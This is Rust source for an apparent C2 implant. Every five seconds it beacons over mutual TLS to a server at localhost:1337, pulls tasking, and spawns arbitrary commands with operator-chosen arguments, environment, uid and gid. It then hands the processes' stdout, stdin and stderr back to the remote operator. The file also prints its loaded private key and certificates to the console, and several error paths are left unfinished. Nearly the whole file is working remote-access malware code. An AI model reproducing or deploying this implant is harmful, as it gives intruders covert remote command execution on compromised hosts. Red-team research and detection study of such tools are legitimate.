#![feature(random)]
use std::{
    collections::HashMap,
    fs::{self, File},
    io::{
        self,
        ErrorKind::{self, Other},
        Read, Write,
    },
    net::{TcpStream, ToSocketAddrs},
    os::unix::process::CommandExt,
    process::{ChildStderr, ChildStdin, ChildStdout},
    random::random,
    sync::{
        mpsc::{Receiver, Sender, TryRecvError},
        Mutex,
    },
    thread,
    time::Duration,
};

use proto::{
    request::{self, Request},
    response::{self, Response},
};
use rustls::{
    pki_types::{pem::PemObject, CertificateDer, PrivateKeyDer, ServerName},
    ClientConfig, ClientConnection, RootCertStore,
};

type Handles = Mutex<HashMap<u64, Handle>>;

fn main() {
    let ca_cert = fs::read("./ca.pem").unwrap().leak();
    let client_cert = fs::read("./client.crt").unwrap().leak();
    let client_key = fs::read("./client.key").unwrap().leak();
    println!("{ca_cert:?}\n\n{client_cert:?}\n\n{client_key:?}");
    let (tx, rx) = start_callback(
        "c2",
        Duration::from_secs(5),
        "localhost:1337",
        ca_cert,
        client_cert,
        client_key,
    )
    .unwrap();

    let handles: Handles = Mutex::new(HashMap::new());

    while let Ok(Request { session, seq, req }) = rx.recv() {
        match req {
            request::RequestType::Exec(exec) => {
                do_exec(exec, session, seq, &handles, tx.clone());
            }
            request::RequestType::Read(read) => {
                do_read(read, session, seq, &handles, tx.clone());
            }
            _ => println!("Unsupported type"),
        }
    }
}
fn do_exec(
    exec: request::Exec,
    session: u64,
    seq: u64,
    handles: &Handles,
    tx: Sender<response::Response>,
) {
    let request::Exec {
        command,
        args,
        env,
        current_dir,
        uid,
        gid,
    } = exec;
    let mut command = std::process::Command::new(command);
    command.args(args);

    for env_action in env {
        match env_action {
            request::Env::Clear => command.env_clear(),
            request::Env::Delete(key) => command.env_remove(key),
            request::Env::Add((key, val)) => command.env(key, val),
            request::Env::Append((key, val)) => {
                let mut new_val = std::env::var(&key).unwrap_or_default();
                new_val.push_str(&val);
                command.env(key, new_val)
            }
        };
    }

    if let Some(current_dir) = current_dir {
        command.current_dir(current_dir);
    }
    if let Some(gid) = gid {
        command.gid(gid);
    }

    if let Some(uid) = uid {
        command.uid(uid);
    }

    match command.spawn() {
        Ok(mut child) => {
            let mut handles = handles.lock().unwrap();
            if let Some(stdout) = child.stdout.take() {
                let id: u64 = random();
                handles.insert(id, stdout.into());
                tx.send(Response {
                    session,
                    seq,
                    res: response::ResponseType::NewHandle(response::NewHandle {
                        note: "stdout".to_owned(),
                        id,
                    }),
                })
                .unwrap();
            }
            if let Some(stdin) = child.stdin.take() {
                let id: u64 = random();
                handles.insert(id, stdin.into());
                tx.send(Response {
                    session,
                    seq,
                    res: response::ResponseType::NewHandle(response::NewHandle {
                        note: "stdin".to_owned(),
                        id,
                    }),
                })
                .unwrap();
            }
            if let Some(stderr) = child.stderr.take() {
                let id: u64 = random();
                handles.insert(id, stderr.into());
                tx.send(Response {
                    session,
                    seq,
                    res: response::ResponseType::NewHandle(response::NewHandle {
                        note: "stderr".to_owned(),
                        id,
                    }),
                })
                .unwrap();
            }
        }
        Err(err) => todo!(),
    };
}

fn do_read(
    read: request::Read,
    session: u64,
    seq: u64,
    handles: &Mutex<HashMap<u64, Handle>>,
    tx: Sender<response::Response>,
) {
    let request::Read { id, ammount } = read;
    let mut handles = handles.lock().unwrap();
    let Some(handle) = handles.get_mut(&id) else {
        tx.send(response::Response {
            session,
            seq,
            res: response::ResponseType::HandleNotFound(id),
        })
        .unwrap();
        return;
    };
    let data = match ammount {
        request::ReadAmount::End => {
            let mut buf = Vec::new();
            handle.read_to_end(&mut buf);
            buf
        }
        request::ReadAmount::Exact(len) => {
            let mut buf = vec![0; len];
            if let Err(e) = handle.read_exact(&mut buf) {
                tx.send(Response {
                    session,
                    seq,
                    res: response::ResponseType::Error(e.to_string()),
                });
                return;
            };
            buf
        }
        request::ReadAmount::Some(len) => {
            let mut buf = vec![0; len];
            let r = handle.read(&mut buf).unwrap();
            buf.resize(r, 0);
            buf
        }
    };
    tx.send(Response {
        session,
        seq,
        res: response::ResponseType::Read(response::Read { data }),
    });
}

enum Handle {
    File(File),
    Socket(TcpStream),
    StdIn(ChildStdin),
    StdOut(ChildStdout),
    StdErr(ChildStderr),
}

impl Read for Handle {
    fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {
        match self {
            Handle::File(file) => file.read(buf),
            Handle::Socket(tcp_stream) => tcp_stream.read(buf),
            Handle::StdIn(_) => Err(ErrorKind::Other.into()),
            Handle::StdOut(child_stdout) => child_stdout.read(buf),
            Handle::StdErr(child_stderr) => child_stderr.read(buf),
        }
    }
}

impl Write for Handle {
    fn write(&mut self, buf: &[u8]) -> io::Result<usize> {
        match self {
            Handle::File(file) => file.write(buf),
            Handle::Socket(tcp_stream) => tcp_stream.write(buf),
            Handle::StdIn(child_stdin) => child_stdin.write(buf),
            Handle::StdOut(_) => Err(ErrorKind::Other.into()),
            Handle::StdErr(_) => Err(ErrorKind::Other.into()),
        }
    }

    fn flush(&mut self) -> io::Result<()> {
        todo!()
    }
}

impl From<ChildStdout> for Handle {
    fn from(value: ChildStdout) -> Self {
        Handle::StdOut(value)
    }
}
impl From<ChildStdin> for Handle {
    fn from(value: ChildStdin) -> Self {
        Handle::StdIn(value)
    }
}
impl From<ChildStderr> for Handle {
    fn from(value: ChildStderr) -> Self {
        Handle::StdErr(value)
    }
}

#[derive(Debug)]
enum ConnectError {
    NoCerts,
    InvalidServerName,
    BadPem,
    BadConfig,
}

fn start_callback(
    name: &'static str,
    sleep: Duration,
    upstream_addr: impl ToSocketAddrs + Send + 'static,
    ca_cert: &'static [u8],
    client_cert: &'static [u8],
    client_key: &'static [u8],
) -> Result<(Sender<response::Response>, Receiver<request::Request>), ConnectError> {
    let (res_tx, res_rx) = std::sync::mpsc::channel();
    let (req_tx, req_rx) = std::sync::mpsc::channel();
    thread::spawn(move || -> Result<(), ConnectError> {
        let mut error_count = 0;
        'main: loop {
            thread::sleep(sleep);
            let mut responses = Vec::new();
            'recv: loop {
                match res_rx.try_recv() {
                    Ok(v) => responses.push(v),
                    Err(TryRecvError::Empty) => break 'recv,
                    Err(TryRecvError::Disconnected) => break 'main,
                }
            }
            let mut ctx = setup_ctx(name, ca_cert, client_cert, client_key)?;
            match transfer_c2(&mut ctx, responses, &upstream_addr) {
                Ok(requests) => {
                    for req in requests {
                        if let Err(_) = req_tx.send(req) {
                            break 'main;
                        };
                    }
                    error_count = 0;
                }
                Err(_) => {
                    error_count += 1;
                    println!("Error");
                    if error_count > 5 {
                        break 'main;
                    }
                    continue;
                }
            };
        }
        Ok(())
    });
    Ok((res_tx, req_rx))
}

fn setup_ctx(
    name: &'static str,
    ca_cert: &[u8],
    client_cert: &[u8],
    client_key: &[u8],
) -> Result<ClientConnection, ConnectError> {
    let mut store = RootCertStore::empty();
    store
        .add(CertificateDer::from_pem_slice(ca_cert).or(Err(ConnectError::BadPem))?)
        .or(Err(ConnectError::NoCerts))?;
    let config = ClientConfig::builder()
        .with_root_certificates(store)
        .with_client_auth_cert(
            vec![CertificateDer::from_pem_slice(client_cert).or(Err(ConnectError::BadPem))?],
            PrivateKeyDer::from_pem_slice(client_key).or(Err(ConnectError::BadPem))?,
        )
        .unwrap();
    let name: ServerName = name.try_into().or(Err(ConnectError::InvalidServerName))?;
    let ctx = ClientConnection::new(config.into(), name).or(Err(ConnectError::BadConfig))?;
    Ok(ctx)
}

fn transfer_c2(
    ctx: &mut ClientConnection,
    responses: Vec<response::Response>,
    upstream_addr: impl ToSocketAddrs,
) -> Result<Vec<request::Request>, io::Error> {
    let mut tcp_conn = std::net::TcpStream::connect(&upstream_addr)?;
    tcp_conn.set_read_timeout(Some(Duration::from_secs(10)))?;
    tcp_conn.set_write_timeout(Some(Duration::from_secs(10)))?;

    let mut stream = rustls::Stream::new(ctx, &mut tcp_conn);

    bincode::encode_into_std_write(responses, &mut stream, bincode::config::standard())
        .or(Err(Other))?;
    bincode::decode_from_std_read(&mut stream, bincode::config::standard()).or(Err(Other.into()))
}
